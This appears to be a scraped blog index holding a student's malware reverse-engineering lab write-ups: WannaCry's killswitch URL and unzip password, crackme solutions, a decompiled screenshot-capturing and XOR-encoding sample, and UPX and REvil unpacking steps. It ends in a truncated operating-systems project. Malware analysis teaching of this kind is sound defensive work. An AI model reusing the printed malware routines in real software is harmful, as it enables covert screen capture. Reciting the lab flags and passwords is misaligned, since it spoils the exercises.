__readfsdword(\u0026#39;0\u0026#39;); byte_408031 = __ROL1__(byte_408031, 4); byte_408030 = __ROR1__(__ROL1__(-112, 2), 3); byte_408030 ^= \u0026#39;\\r\u0026#39;; byte_408031 = __ROR1__(byte_408031, 5); byte_408032 ^= \u0026#39;�\u0026#39;; byte_408033 = __ROR1__(__ROR1__(-3, 4), 1); byte_408032 = __ROR1__(byte_408032, 2); byte_408031 = __ROR1__(byte_408031, 1); byte_408031 ^= \u0026#39;�\u0026#39;; byte_408030 = __ROL1__(byte_408030, 6); byte_408030 ^= \u0026#39;r\u0026#39;; LOBYTE(v1) = *(_BYTE *)(v1 + 2); byte_408031 = __ROL1__(byte_408031, 1); byte_408033 ^= \u0026#39;�\u0026#39;; byte_408033 = __ROL1__(byte_408033, 7); byte_408032 += v1; for ( i = 4; i; --i ) { v3 = i - 1; *(\u0026amp;byte_408030 + v3) \u0026amp;= \u0026#39;\\x19\u0026#39;; *(\u0026amp;byte_408030 + v3) += 97; } return 1; } Try to observe the assembly code of these program, then you will see some tricky ... .tls:0040112B mov ebx, large fs:30h ... .tls:0040118B mov bl, [ebx+2] Then according to other write up, just patched it as mov bl, 0, then done. Just like other write up said Another part of the password generation mechanism uses the BeingDebugged flag to compute values. BeingDebugged would be set to 0 if no debugger is present. The assignment of BeingDebugged was patched to always assign 0, in the generation function at 40118B.\nFinally observe the byte code at 00408030, the password is byrr "},{"id":197,"href":"/security/course/ntu-mr/ntu-malware-reverse-lab-1-write-up/","title":"NTU Malware Reverse Lab 1 write up","section":"Securities","content":" NTU Malware Reverse Lab 1 write up # tags: NTU_MR Malware Reverse Engineering and Analysis NTU # Name 何秉學 StuID R11921A16 WannaCry # Change variable and data type # Follow the video and replace most of the variable that ghidra did not recognize and retype them also. According to the video, you must search the entry point function(local_6c = FUN_00408140();) first and replace the signature by here Then click into WinMain function and you\u0026rsquo;ll see a strange url at the beginning of the top. Try to rename and retype it as char*. Ghidra can not recognize InternetOpenA, and InternetOpenUrlA. But you can found that ghidra cannot recognize hinternet datatype as well. So, we must create new datatype in Datt Type Manager. And in write_1831_to_tasksche.exe function, the first if-statement has 4 variable that ghidra can\u0026rsquo;t recognize, including createProcessA, _createFileA, _writeFile, _closeHandle. So, you\u0026rsquo;re not only rename them but retype them for the following statement for each of them.(Ghidra has all type of them but it just can not recognize.) When you have 1831.bin file(you can follow Analyze part at 5-th and 6-th section), useing Defined String window to check out some function including unzip_something function. Scroll down the Defined String, you\u0026rsquo;ll see string 13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94 at 0x0040f488. Then in assembly code, there\u0026rsquo;re 3 similar function be called at the sametime. We called it bitcoin_something function. Analyze # For the first part to analyze, you can check out for loop after strange_url variable. It does this loop for 14 times and copy strange_url to strange_url_copy by andding 4. Next, you can find an if statement at the below. Check this out carefully, it the internet request failed, it\u0026rsquo;ll access wannacry_real_entry() function. Enter to wannacry_real_entry function, you\u0026rsquo;ll see another if statement to examine your argument input. If you keyin less than 1 argument, it\u0026rsquo;ll execute no_argument_handler function and start create_wannacry_service function. Checking wannacry program in second function of no_argument_handler function by assembly language, you\u0026rsquo;ll find there\u0026rsquo;re two sprintf structure are not correct in the middle paragraph. Because, there\u0026rsquo;re two more argument should be pushed in stack but not be recognized by ghidra, including s_tasksche.exe_0043136c and 0x00407dea and s_WINDOWS_00431367 at 0x00407df2. So, we have to override this line signature and add the remaining argument back to sprinf. So, let\u0026rsquo;s take a look at this flow chart of what happened so far Then I used another VM(Ubuntu) to command wrestool to analyze wannacry file and output another file named 1831.bin. Using ghidra to analyze this file. Then do the same thing as above that what we do to analyze wannacry file such as change WinMain signature or renamee variable or retype variable, etc. While you\u0026rsquo;re analyzing in WinMain function, you\u0026rsquo;ll see a strange variable \u0026amp;_Str2_0040f538 which store \u0026lsquo;/i\u0026rsquo; characters. You can just press \u0026lsquo;c\u0026rsquo; in assembly code to show \u0026lsquo;\\i\u0026rsquo;. Next, scroll down this file, you\u0026rsquo;ll see a strange swprintf parameter called _Count_0040f40c. Then select all addr type data and right click mouse and select clear with option. You\u0026rsquo;ll see many unicode strings. Finally, right click DAT_0040f40c and choose Data/TerminatedUnicode. Finally, you can check this figure to know the whole operation flow 1.1 What is the \u0026lsquo;killswitch\u0026rsquo; string? Ans: http://www.iuqerfsodp9ifjaposdfj 1.2 What is the unzip password? (as show in below) Ans: WNcry@2o17\nNoREpls # Step1 - Checking Language # You should check what lauguage of this program, so load it in IDA and see the import. You can find a lot of functions that resemble C functions such as CreateFileW() and isDebuggerPresent function here as well.-\u0026gt;This is important Step2 - Static Analysis # Try to run NoREpls.exe. Then you can view string window to find the function that prompt the invalid registration. However, here\u0026rsquo;s nothing useful info but a lot of random code. Try to search the string in Name window and we found this. Clicking in it, you\u0026rsquo;ll find important string here. Use x-ref to jump to the section in which to call this string. You\u0026rsquo;ll see the lable of this section 0x4010DB. So, let\u0026rsquo;s use x-ref method again to jump to where to called. Then press f5 to disassemble this section and you\u0026rsquo;ll see the function. Press into sub_401000 function and see an unencrypt secret code here. Then you got the secret code and registered it successfully Untitiled # Refer to b1h0 # Step1 - Try to run # When you tried to run this program，it just flashed a little bit time and vanished rapidly. Then you can use dbg(debugger) to set a broken point. Step2 - Use x64dbg debugger # Actually, when you entry the program, you\u0026rsquo;ll find the flag easily down below the entry point a little bit. So, based on the truth we found above, you can observe the address 0x00401500 is as the entry of subroutine that we called sub_result_cracked Then we can find address 0x004013DD called address 0x0040162c that aimed to compare the important value. The command line will print the flag or try_harder depends on this important value. So, we can take a look next.You can focus at 0x0040163A that move C1 to memory and then compare itself at the following command. Review what is jle you can take a look at here. As the default, it\u0026rsquo;ll jump to 0x401653 for sure and move string \u0026ldquo;try harder\u0026rdquo; and print it out. So, the first point is we must let the statement false by revise the value of C1 at 0x00401642 like this. You can revise any value that make the statement false. Here is following b1H0 to revise zero. Bypass the jump statement, then we must set another breakpoint at 0x00401664 to watch the print out before the program closed. "},{"id":198,"href":"/security/course/ntu-mr/ntu-malware-reverse-lab-2-write-up/","title":"NTU Malware Reverse Lab 2 write up","section":"Securities","content":" NTU Malware Reverse Lab 2 write up # tags: NTU_MR Malware Reverse Engineering and Analysis NTU # Name 何秉學 StuID R11921A16 Analyze the malware 1 found in the file Lab13-02.zip -\u0026gt; Lab13-02.exe, generate \u0026lsquo;yourself\u0026rsquo; write ups (with screenshots) and answer the follow questions : # 1.1 Using dynamic analysis, determine what this malware creates. Ans:\nAccording to reference, you can also use procmon(Process Monitor) to monitor the whole progress after executing this file. The progress of first iteration is shown as below Then use PEiD to check if the file has shell or not. And refer to the result as below, it seems has not shell, so that we can use IDA directly. I used IDA to analyze this executable file and observe that it\u0026rsquo;ll execute sub_401851 function every 10 seconds. And when I execute it in VM, it\u0026rsquo;ll create a temp file name temp00XXXXXX. int __cdecl main(int argc, const char **argv, const char **envp) { while ( 1 ) { Sleep(5000u); sub_401851(); Sleep(5000u); } } 1.2 Use static techniques such as an xor search, FindCrypt2, KANAL, and the IDA Entropy Plugin to look for potential encoding. What do you find?(Install findcrypt and IDA Entropy plugin can refer to Appendix 1, 2) Ans:\nRefer to [4], I used KANAL, a plugin in PEiD, to examine whether it has been crypto or not. Apparently, it has not crypto signature. Used another plugin in IDA, Findcrypt, to check if the file has been crypted and it seems that has not been crypted. Used text search in search icon You can see that there\u0026rsquo;re 12 xor result used by 0x00401739 and one used by 0x0040128D. Especially, 4 of the xor instructions did not belong to any function. So, check out the structure of main function and sub_401851 and renamed the sub-function by [1]. .text:00401851 ; =============== S U B R O U T I N E ======================================= .text:00401851 .text:00401851 ; Attributes: bp-based frame .text:00401851 .text:00401851 sub_401851 proc near ; CODE XREF: _main+2D↓p .text:00401851 .text:00401851 FileName = byte ptr -20Ch .text:00401851 hMem = dword ptr -0Ch .text:00401851 nNumberOfBytesToWrite= dword ptr -8 .text:00401851 var_4 = dword ptr -4 .text:00401851 .text:00401851 push ebp .text:00401852 mov ebp, esp .text:00401854 sub esp, 20Ch .text:0040185A mov [ebp+hMem], 0 .text:00401861 mov [ebp+nNumberOfBytesToWrite], 0 .text:00401868 lea eax, [ebp+nNumberOfBytesToWrite] .text:0040186B push eax .text:0040186C lea ecx, [ebp+hMem] .text:0040186F push ecx .text:00401870 call Take_Screenshot .text:00401875 add esp, 8 .text:00401878 mov edx, [ebp+nNumberOfBytesToWrite] .text:0040187B push edx .text:0040187C mov eax, [ebp+hMem] .text:0040187F push eax .text:00401880 call Encode_Func .text:00401885 add esp, 8 .text:00401888 call ds:GetTickCount .text:0040188E mov [ebp+var_4], eax .text:00401891 mov ecx, [ebp+var_4] .text:00401894 push ecx .text:00401895 push offset aTemp08x ; \u0026#34;temp%08x\u0026#34; .text:0040189A lea edx, [ebp+FileName] .text:004018A0 push edx ; char * .text:004018A1 call _sprintf .text:004018A6 add esp, 0Ch .text:004018A9 lea eax, [ebp+FileName] .text:004018AF push eax ; lpFileName .text:004018B0 mov ecx, [ebp+nNumberOfBytesToWrite] .text:004018B3 push ecx ; nNumberOfBytesToWrite .text:004018B4 mov edx, [ebp+hMem] .text:004018B7 push edx ; lpBuffer .text:004018B8 call Write_File .text:004018BD add esp, 0Ch .text:004018C0 mov eax, [ebp+hMem] .text:004018C3 push eax ; hMem .text:004018C4 call ds:GlobalUnlock .text:004018CA mov ecx, [ebp+hMem] .text:004018CD push ecx ; hMem .text:004018CE call ds:GlobalFree .text:004018D4 mov esp, ebp .text:004018D6 pop ebp .text:004018D7 retn .text:004018D7 sub_401851 endp Used IDA Entropy plugin to check the file and it seems has nothing unusual. The config is as [4] 1.3 Based on your answer to question 1, which imported function would be a good prospect for finding the encoding functions? Ans: As reference [1], we can see what sub-function did. And as [2] said, we can start at WriteFile to trace back and to find encoding function, because most of the process will encode the file right before WriteFile funtion.\nHGLOBAL sub_401851() { CHAR FileName; // [esp+0h] [ebp-20Ch] HGLOBAL hMem; // [esp+200h] [ebp-Ch] DWORD nNumberOfBytesToWrite; // [esp+204h] [ebp-8h] DWORD v4; // [esp+208h] [ebp-4h] hMem = 0; nNumberOfBytesToWrite = 0; Take_Screenshot(\u0026amp;hMem, \u0026amp;nNumberOfBytesToWrite); Encode_Func((int)hMem, nNumberOfBytesToWrite); v4 = GetTickCount(); sprintf(\u0026amp;FileName, aTemp08x, v4); Write_File(hMem, nNumberOfBytesToWrite, \u0026amp;FileName); GlobalUnlock(hMem); return GlobalFree(hMem); } 1.4 Where is the encoding function in the disassembly? Ans:\nAfter accessing to sub_401851(), we can analyze these function clearly, such as sub_401070(Take_Screenshot), sub_40181F(Encode_Func), sub_401000(WriteFile). Especially speaking, we can find an API named GetTickCout. Refer to [5]:\nRetrieves the number of milliseconds that have elapsed since the system was started, up to 49.7 days.\nThe return value is the number of milliseconds that have elapsed since the system was started\nThis seems to be related to file name.\nNow, we can check sub_401070 first\nvoid *__cdecl Take_Screenshot(void **a1, _DWORD *a2) { SIZE_T dwBytes; // ST2C_4 HGLOBAL hMem; // ST24_4 void *result; // eax char pv; // [esp+Ch] [ebp-6Ch] LONG v6; // [esp+10h] [ebp-68h] UINT cLines; // [esp+14h] [ebp-64h] HGLOBAL v8; // [esp+24h] [ebp-54h] void *v9; // [esp+28h] [ebp-50h] HDC hdc; // [esp+2Ch] [ebp-4Ch] struct tagBITMAPINFO bmi; // [esp+30h] [ebp-48h] int v12; // [esp+5Ch] [ebp-1Ch] HGDIOBJ h; // [esp+60h] [ebp-18h] __int16 v14; // [esp+64h] [ebp-14h] SIZE_T v15; // [esp+66h] [ebp-12h] int v16; // [esp+6Eh] [ebp-Ah] int cy; // [esp+74h] [ebp-4h] v12 = GetSystemMetrics(0); cy = GetSystemMetrics(1); hWnd = GetDesktopWindow(); hDC = GetDC(hWnd); hdc = CreateCompatibleDC(hDC); h = CreateCompatibleBitmap(hDC, v12, cy); SelectObject(hdc, h); BitBlt(hdc, 0, 0, v12, cy, hDC, 0, 0, 0xCC0020u); GetObjectA(h, 24, \u0026amp;pv); bmi.bmiHeader.biSize = 40; bmi.bmiHeader.biWidth = v6; bmi.bmiHeader.biHeight = cLines; bmi.bmiHeader.biPlanes = 1; bmi.bmiHeader.biBitCount = 32; bmi.bmiHeader.biCompression = 0; bmi.bmiHeader.biSizeImage = 0; bmi.bmiHeader.biXPelsPerMeter = 0; bmi.bmiHeader.biYPelsPerMeter = 0; bmi.bmiHeader.biClrUsed = 0; bmi.bmiHeader.biClrImportant = 0; dwBytes = cLines * 4 * ((32 * v6 + 31) / 32); hMem = GlobalAlloc(0x42u, cLines * 4 * ((32 * v6 + 31) / 32)); bmi.bmiColors[0] = (RGBQUAD)GlobalLock(hMem); GetDIBits(hDC, (HBITMAP)h, 0, cLines, *(LPVOID *)bmi.bmiColors, \u0026amp;bmi, 0); v16 = 54; v15 = dwBytes + 54; v14 = 19778; v8 = GlobalAlloc(0x42u, dwBytes + 54); v9 = GlobalLock(v8); memcpy(v9, \u0026amp;v14, 0xEu); memcpy((char *)v9 + 14, \u0026amp;bmi, 0x28u); memcpy((char *)v9 + 54, *(const void **)bmi.bmiColors, dwBytes); GlobalUnlock(hMem); GlobalFree(hMem); ReleaseDC(hWnd, hDC); DeleteDC(hdc); DeleteObject(h); result = v9; *a1 = v9; *a2 = dwBytes + 54; return result; } In line 22, refer to [6]\nRetrieves a handle to the desktop window. The desktop window covers the entire screen. The desktop window is the area on top of which other windows are painted.\nThe return value is a handle to the desktop window.\nThese codes aim to take a screenshot on your monitor.\nCheck sub_40181F()\nint __cdecl Encode_Func(int a1, int a2) { char v3; // [esp+0h] [ebp-44h] memset(\u0026amp;v3, 0, 0x44u); return sub_401739(\u0026amp;v3, (_DWORD *)a1, (int *)a1, a2); } And sub_401739()\nint __cdecl sub_401739(_DWORD *a1, _DWORD *a2, int *a3, unsigned int a4) { int result; // eax unsigned int i; // [esp+0h] [ebp-4h] for ( i = 0; i \u0026lt; a4; i += 16 ) { sub_4012DD(a1); *a3 = (a1[3] \u0026lt;\u0026lt; 16) ^ (a1[5] \u0026gt;\u0026gt; 16) ^ *a1 ^ *a2; a3[1] = (a1[5] \u0026lt;\u0026lt; 16) ^ (a1[7] \u0026gt;\u0026gt; 16) ^ a1[2] ^ a2[1]; a3[2] = (a1[7] \u0026lt;\u0026lt; 16) ^ (a1[1] \u0026gt;\u0026gt; 16) ^ a1[4] ^ a2[2]; a3[3] = (a1[1] \u0026lt;\u0026lt; 16) ^ (a1[3] \u0026gt;\u0026gt; 16) ^ a1[6] ^ a2[3]; a2 += 4; a3 += 4; result = i + 16; } return result; } It used a lot of bit wise XOR and shift after sub_4012DD(a1).\n1.5 Trace from the encoding function to the source of the encoded content. What is the content? Ans: The answer is shown as above.\n1.6 Can you find the algorithm used for encoding? If not, how can you decode the content? Ans: The answer is shown as Q1.4.\n1.7 Using instrumentation, can you recover the original source of one of the encoded files? Ans:\nSurvey many website, I still can not handle Immunity Debugger. The website is as below 開始寫Immunity Debugger PyCommand Immunity Debugger简介 Python筆記\u0026mdash;Immunity Debugger So, I can not return the encrypted bmp files to original image that can be visualized. Instead, I used x64dbg to revise encode function that will not allow to be accessed. Then we can get a bmp file that haven\u0026rsquo;t encrypted. Adding the bmp extension, we get a desktop screenshot image properly. Analyze the RoboAuth sample 2,3: RoboAuth.exe.zip -\u0026gt; RoboAuth.exe # Answer how to resolve the password 1 and password 2 (as shown in below), then generate \u0026lsquo;yourself\u0026rsquo; write ups (with screenshots).\nStep 1: First of all, we used x32dbg to analyze RoboAuth.exe and search some useful string such as You Passed level1! at 0x00401B75. And set the break point at 0x00401B6C(call strcmp). But, I can not recognized the answer like the write up video. So, I used Ollydbg like the video and it showed the compare string right beside the memory window. ↦ r0b0RUlez! Step 2 After entering the password, we can continue to step over(press F8) and it\u0026rsquo;ll call 0x004015EA at 0x00401B88. Now, you can see an ASCII string above that show \u0026quot;You win. Congratulations!\u0026quot; Set the break point at and enter random string as second password. Then step into(press F7) the function 0x00401547. Step 3 Observe the following code first. Address Hex dump Command 00401547 /$ 55 PUSH EBP 00401548 |. 89E5 MOV EBP,ESP 0040154A |. EB 22 JMP SHORT 0040156E 0040154C |\u0026gt; 8B45 08 /MOV EAX,DWORD PTR SS:[ARG.1] 0040154F |. 0FB610 |MOVZX EDX,BYTE PTR DS:[EAX] 00401552 |. 8B45 0C |MOV EAX,DWORD PTR SS:[ARG.2] 00401555 |. 0FB600 |MOVZX EAX,BYTE PTR DS:[EAX] 00401558 |. 83F0 02 |XOR EAX,00000002 0040155B |. 38C2 |CMP DL,AL 0040155D |. 74 07 |JE SHORT 00401566 0040155F |. B8 01000000 |MOV EAX,1 00401564 |. EB 17 |JMP SHORT 0040157D 00401566 |\u0026gt; 8345 08 01 |ADD DWORD PTR SS:[ARG.1],1 0040156A |. 8345 0C 01 |ADD DWORD PTR SS:[ARG.2],1 0040156E |\u0026gt; 8B45 0C |MOV EAX,DWORD PTR SS:[ARG.2] 00401571 |. 0FB600 |MOVZX EAX,BYTE PTR DS:[EAX] 00401574 |. 3C 02 |CMP AL,2 00401576 |.^ 75 D4 \\JNE SHORT 0040154C 00401578 |. B8 00000000 MOV EAX,0 0040157D |\u0026gt; 5D POP EBP 0040157E \\. C3 RETN You can see MOVZX EDX,BYTE PTR DS:[EAX] in line 6 and MOVZX EDX,BYTE PTR DS:[EAX] in line 7. In line 6, EAX stored the character you entered. And in line 7, it stored a whole new value 0x0060FDBC. Try to trace it in dump. You can see ASCII characters u1nnf2lg. Then observe the following code, you\u0026rsquo;ll see it execute a XOR operation with 0x00000002. And then compare every single character to the real password, that is u1nnf2lg xor 2. Step 4 So, if we want to know what the real password is, we just need to XOR by hand or use some code that [2] provided. The result of the real password is shown as below. ↦ w3lld0ne The flag in this question is r0b0RUlez!_w3lld0ne.\nAppendix # Install findcrypt-yara Install python 2.7 ↦ add python and python/script to environment variable ↦ follow findcrypt-yara IDA的一个插件安装 and IDA7.0安装findcrypt插件 Error handler Alternative link for Microsoft Visual C++ Compiler for Python 2.7 Install IDA Entropy Plugin Description Install ↦ Install repo. and untar it(Must choose python2 version) ↦ place the .py file to plugin folder ↦ use pip to install matplotlib ↦ restart IDA Something related to Immunity Debugger Example of immunity debugger Immunity Debugger Installation Extra info.?! Reference # Lab 1 Lab 13-02 Analysis practical-malware-analysis KANAL - Krypto Analyzer for PEiD 分析恶意代码文件Lab13-02.exe GetTickCount GetDesktopWindow Example of immunity debugger Immunity Debugger Installation Extra info.?!\nLab 2 lab2 write up video\n"},{"id":199,"href":"/security/course/ntu-mr/ntu-malware-reverse-lab-3-write-up/","title":"NTU Malware Reverse Lab 3 write up","section":"Securities","content":" NTU Malware Reverse Lab 3 write up # tags: NTU_MR Malware Reverse Engineering and Analysis NTU # [TOC]\nName 何秉學 StuID R11921A16 Review Packing and Unpacking # How does packing and unpacking work? 作者會把原本的code section和data section，放在UPX1，並且用unpacking stub(裡面存放解殼的程式)，把UPX1的內容一點一點的還原回UPX0(也就是空區段)，並跳回正常程式的執行進入點(original entry point, OEP)，最後跳回去的動作叫做Tail Jump或Long Jump，另外，多長的jump才是長，可能要依照經驗值判斷，或是直接跳過去後分析程式在幹嘛 實際上執行脫殼的時候，除了OEP的重建外，還需要重建Imports，這兩者都處理好後才算是脫殼完成 當分析脫殼執行到如下圖這樣的情況時，就離終點不遠了，也就是jmp的地址離目前的程式很遠，且之後的程式有很多空指令或垃圾byte，此為UXP殼的特徵 可以用PEiD這個工具(或是用Entropy之類的，但是不一定準確)判斷樣本有沒有加殼，或是加了甚麼殼，上圖是沒有加殼的一般程式，下圖是加了UPX的加殼程式 若是要處理Import Table Reconstruction，可以用OllyDump、ImpRec或是Scylla這些工具來進行，在Practice中是用Scylla演示(且可以搭配x32dbg或x64dbg進行) 老師有說在Long Jump之前會搭配pop instruction，這可能可以當作解析OEP的線索 Tail Jump，不一定是用jmp，也可以是call instruction；另外，跳轉的地址也不一定是一個明確的地址，也可能用暫存器存起來，這部分可以注意一下 Practice - upx_exercise.exe # Observation # First things first, we can observe the file by executing it directly. Obviously, you should enter correct CTF key by analyzing. Unpacking # Static analysis - IDA Pro # You are not allowed to disassembly by doing nothing, because it was packed by UPX. Therefore, our objective is to unpack it and try to analyze it original code to get the CTF Flag. Dynamic analysis - x32dbg # In UPX-based packing, it has a feature that in order to not let the data be flushed during unpacking, it must store all data to the stack by using pushad instruction. Then, you\u0026rsquo;ll see a lot of jmp instruction to unpack the original code. Scrolling down the code, you\u0026rsquo;ll see a popad instruction at 0x0134AEDE , a jmp instruction at 0x010EAEEC, and a lots of null instruction which all three are satisfied all features that UPX-based packing method has. It\u0026rsquo;ll restore all data that stored in stack and jump to upx_exercise.134244D. Set the break-point and press run button in x32dbg, then press step into button to observe the code. Now, the code has already unpacked, then we can use Scylla to do Import Reconstruction. Press IAT Autosearch(Import Address Table) button to search and then press Get Imports button. Finally, you will get all imports that this file used, and Scylla will help you to rebuild it. Press Dump button to get IAT file. Press Fix Dump and choose the file what we dump to reconnect the IAT and this file. You\u0026rsquo;ll see the log said Import Rebuild success and you\u0026rsquo;ll get a new file named upx_exercise_dump_SCY.exe that repaired by Scylla. Analyze # Re-static analysis - IDA Pro # Used IDA to reanalyze the unpacking file. Used string searching to find the string nope that appear in your cmd. Used cross reference to find which part has used it. The main part is shown as below ... sub_E01EB0(std::cin, \u0026amp;Memory); LOBYTE(v116) = 1; MEMORY[0] = 0; v96 = 0xFCC1D3C4; v97 = 0xD8D2C8DE; v98 = 0xD8D3E8E0; v99 = 0xD8C2EFB0; v100 = 0xC2ECB3C1; v101 = 0xB3EBE1D8; v102 = 0xD5F3D8BE; v103 = 0xB3EFD8DE; v104 = 0xF5C2E3D5; v105 = 0xFAD6D6D8; v64 = 1; HIBYTE(v95) = 1; v65 = 0; v93 = 0; while ( v65 \u0026lt; 40 ) { v66 = (char *)\u0026amp;Memory; if ( v111 \u0026gt;= 16 ) v66 = (char *)Memory; v67 = v66[v65] ^ 0x87; v68 = *((unsigned __int8 *)\u0026amp;v96 + v65); v94 = 0; if ( v67 != v68 ) v64 = v94; HIBYTE(v95) = v64; v93 = ++v65; } v69 = \u0026#34;Congratz?!\u0026#34;; if ( !v64 ) v69 = \u0026#34;Nope!\u0026#34;; ... From v96 to v105, it stored 40 bytes and it seems do something in while loop 40 times. In addition, v67 = v66[v65] ^ 0x87; this line used xor instruction that seems a encrypt part. And then it compared \u0026amp;v96 + v65 and v67 that encrypt the string what you input. If all the strings you input after process xor to 0x87 are strictly the same with v96 to v105, then it\u0026rsquo;ll print Congratz?!, otherwise, print Nope. Used online_xor to get v96 to v105 encrypted strings. And then used online_hex2ascii to get the CTF Flag. The answer is **CTF{YOU_goT_7hE_F4kE_fl49_tRY_h4RdEr_QQ}**, though it is not a real answer. Note that, the demo from TA is finished, therefore, I still don\u0026rsquo;t know the real flag is. Homework - upx_Revil.exe # Static Analysis Observation # Use IDA to analyze this sample and obviously packed sample Use the skill above then you can answer the question easily. Homework - custom_packer_Revil.exe # Static Analysis Observation - DetectItEasy # Though I used the tool, DetectItEasy to check if this sample was packed or not, the answer is not quite explicit. Through the write up made by Security Joe, it\u0026rsquo;s not a simple UPX sample.\nThis packer can be classified as a hybrid packer because during its execution it injects several pieces of shellcode to finally replace the complete memory image of the PE. A diagram that explains this kind of packer is shown below.\nThis kind of packer will do a self injection in its own memory space.Basically, it\u0026#39;ll allocate or creating a new memory section in the same process and it can write shellcode or complete PE files to execute. Basically, it\u0026rsquo;s going to read the encrypted content, and gonna save or gonna copy that to the new section(the yellow block) Analyze \u0026amp; Find OEP # Finding first injected shellcode (LocalAlloc) Set the break point at 0x00404DB6 and step into this line And you\u0026rsquo;ll find the module that you are analyzing is kernel32.dll. This is not what we care, so we press the button(Execute till return) to skip this module. And then step into this operation to go back to the custom packer REvil from windows library. Follow the memory address in dump Then continue to execute the code, you will see there are 3 nested loop. Please pay attention to the dump. When I finish the loop, the dump memory is different(Fig.2). These loops are aim to moving the shellcode to memory section, just as the same what we talked about before. While you are continuing to execute forward, you can see the dump memory has changed at 0x00404E38. * Note that you can dump these memory to a new file by right click and select Follow in Memory Map, and then right click again then choose Dump memory to File * Note that the file you dump is actually a shellcode. How to know? Finding second injected shellcode (VirtualAlloc) Find the expression by pressing Ctrl+G and type VirtualAlloc. Set the break point at the first line and do the same thing above. Pressing Execute till return and check the memory by right click EAX and choose Follow in Dump. Finally, press step into to return Like the same outcome above. While you are continuing to execute, you\u0026rsquo;ll notice that memory have changed when you step over 0x02B95269. * Note that this is 2nd shellcode that can check in disassembler. And obviously, 0x02B9527D is the 2nd tail jump that will jump to blue shellcode block from yellow shellcode block. You can see that the jumping address is quite different with current address(the following image is not my actually circumstances) Payload decryption (VirtualAlloc) In this section, it\u0026rsquo;ll use VirtualAlloc again. So, we just press Run button to get in there. And follow the instruction above. Go back → Follow EAX address in dump → Step into → You\u0026rsquo;ll see 3 nested loop again → Set break point → Run → The memory changed in dump again(this is our payload in memory) Dump these code in a new file like above. Code substitution (VirtualProtect) In this section, it\u0026rsquo;ll use VirtualProtect API, so that we just follow the instruction above.\nFind VirtualProtect by Ctrl+G → Set break point and press Run button\nInteresting things Check out the page talking about VirtualProtect.\nChanges the protection on a region of committed pages in the virtual address space of the calling process. To change the access protection of any process, use the VirtualProtectEx function.\nAnd you can especiallly take a look at\n[in] flNewProtect The memory protection option. This parameter can be one of the memory protection constants.\nFollow the page, you can notice that 0x40 is PAGE_EXECUTE_READWRITE\nYou can see the whole parameters about VirtualProtect in stdcall. They want to modify the original section(replace)\nContinue the instruction mentioned above: go back → step into\nFinding the \u0026ldquo;Tail jump\u0026rdquo; Scrolling~~ down and find a looooog jump at 0x001C091E and step into. Finding the OEP 0x00404161 is your OEP Homework # Analyze the malware found in the file workshop_samples.zip -\u0026gt; upx_REvil.exe, generate \u0026lsquo;yourself\u0026rsquo; writeups (with screenshots) and answer the follow questions: 1.1 Where is the memory address of the tail jump? Ans: When you see the machine instruction popad, the tail jump address is 0x00283F8C 1.2 Where is the OEP of the packed sample? Ans: The OEP address is 0x00264161\nAnalyze the malware found in the file workshop_samples.zip -\u0026gt; custom_packer_REvil.exe, generate \u0026lsquo;yourself\u0026rsquo; writeups (with screenshots) and answer the follow questions: 2.1 Where is the memory address of the tail jump? Ans: Scrolling~~ down and find a looooog jump at 0x001C091E and step into. 2.2 Where is the OEP of the packed sample? Ans: 0x00404161 is your OEP "},{"id":200,"href":"/security/course/ntu-os/ntu-operating-system-project-1/","title":"NTU Operating System Project 1","section":"Securities","content":" NTU Operating System Project 1 # tags: NTU_OS Operating System NachOS Thread Management # :::spoiler [TOC] :::\nHow to parse this project # You can research userkernel.cc file first. UserProgKernel will parse the command line and store the file you want to execute in execfile variable which defined at userkernel.h. Then you\u0026rsquo;ll find something interesting. ForkExecute(Thread *t) {t-\u0026gt;space-\u0026gt;Execute(t-\u0026gt;getName());} // space and getName() are defined at thread.h // Execute is defined at addrspace.h This is what we\u0026rsquo;ve learned on lecture that it\u0026rsquo;ll clone a child process and execute the same program as parent process just like a multi-thread. Next, you can observe Run() function void UserProgKernel::Run() { cout \u0026lt;\u0026lt; \u0026#34;Total threads number is \u0026#34; \u0026lt;\u0026lt; execfileNum \u0026lt;\u0026lt; endl; for (int n=1;n\u0026lt;=execfileNum;n++) { t[n] = new Thread(execfile[n]); t[n]-\u0026gt;space = new AddrSpace(); t[n]-\u0026gt;Fork((VoidFunctionPtr) \u0026amp;ForkExecute, (void *)t[n]); cout \u0026lt;\u0026lt; \u0026#34;Thread \u0026#34; \u0026lt;\u0026lt; execfile[n] \u0026lt;\u0026lt; \u0026#34; is executing.\u0026#34; \u0026lt;\u0026lt; endl; } ThreadedKernel::Run(); } Review a very simple concept: Process Representation in Linux // Represented by the C structure task_struct pid t pid; /* process identifier */ long state; /* state of the process */ unsigned int time slice /* scheduling information */ struct task struct *parent; /* this process’s parent */ struct list head children; /* this process’s children */ struct files struct *files; /* list of open files */ struct mm struct *mm; /* address space of this process */ Another related concept is Process Creation Address space Child duplicate of parent Child has a program loaded into it UNIX examples fork() system call creates new process exec() system call used after a fork() to replace the process’ memory space with a new program After reviewing the concept above, we can continue to answer next question(Please follow the next section -\u0026gt; Q2) Project Q\u0026amp;A # Q1: Why the result is not congruent with expected? Because OS has multi-thread concept like the code above and it\u0026rsquo;ll fork child process. When more than 1 process be executed simultaneously without any precondition, it\u0026rsquo;ll happend what we unexpected. And the precondition or you can say the real problem in this case is context switching which is the progress between preocesses switching by CPU. Q2: How to solve the issue?(You can include some code and explain it) According to the previous question, NachOS didn\u0026rsquo;t manage memory for executing multi program and this\u0026rsquo;ll cause the current program\u0026rsquo;s page overlap to the others running program. Thus, we have to revise these two program and let the program\u0026rsquo;s virtual memory map to the real memory that no one used. code/userprog/addrspace.cc code/userprog/addrspace.h Add the code in addrspace.cc at the beginning to stored the usage of all physical pages and stored how many free pages can be used now.\n#define PAGE_OCCU true #define PAGE_FREE false bool AddrSpace::PhyPageStatus[NumPhysPages] = {PAGE_FREE}; int AddrSpace::NumFreePages = NumPhysPages; class AddrSpace { ... private: ... static bool PhyPageStatus[NumPhysPages]; //stored the usage of all physical pages static int NumFreePages; //stored how many free pages can be used now } Take off unnecessary mapping\nAddrSpace::AddrSpace() { } Allocate Physical Pages - Revise at addrspace.cc AddrSpace::Load function\n// SBK: Verify if there is enough space page ASSERT(numPages \u0026lt;= NumPhysPages);\t// check we\u0026#39;re not trying to run anything too big -- at least until we have virtual memory // Allocate pageTable = new TranslationEntry[numPages]; for(unsigned int i = 0, idx = 0; i \u0026lt; numPages; i++) { pageTable[i].virtualPage = i; while(idx \u0026lt; NumPhysPages \u0026amp;\u0026amp; AddrSpace::PhyPageStatus[idx] == 